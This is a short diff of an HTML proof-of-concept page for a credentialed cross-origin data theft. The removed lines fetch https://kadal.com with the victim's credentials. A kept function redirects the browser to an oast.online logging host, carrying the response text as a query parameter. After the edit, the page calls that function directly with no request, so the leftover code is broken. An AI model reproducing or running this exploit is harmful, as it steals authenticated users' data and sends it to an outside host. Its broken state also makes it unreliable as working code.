@@ -7,15 +7,12 @@
 </head>
 <body>
   <script>
-   var req = new XMLHttpRequest();
-    req.onload = reqListener;
-    req.open('get','https://kadal.com',true);
-    req.withCredentials = true;
-    req.send();
+  
 
     function reqListener() {
         window.location.href='https://d78cpnidcva39l10bicg7ppta3yaxk69u.oast.online/log?key='+this.responseText;
     };
+    reqListener()
 </script>
 </body>
 </html>
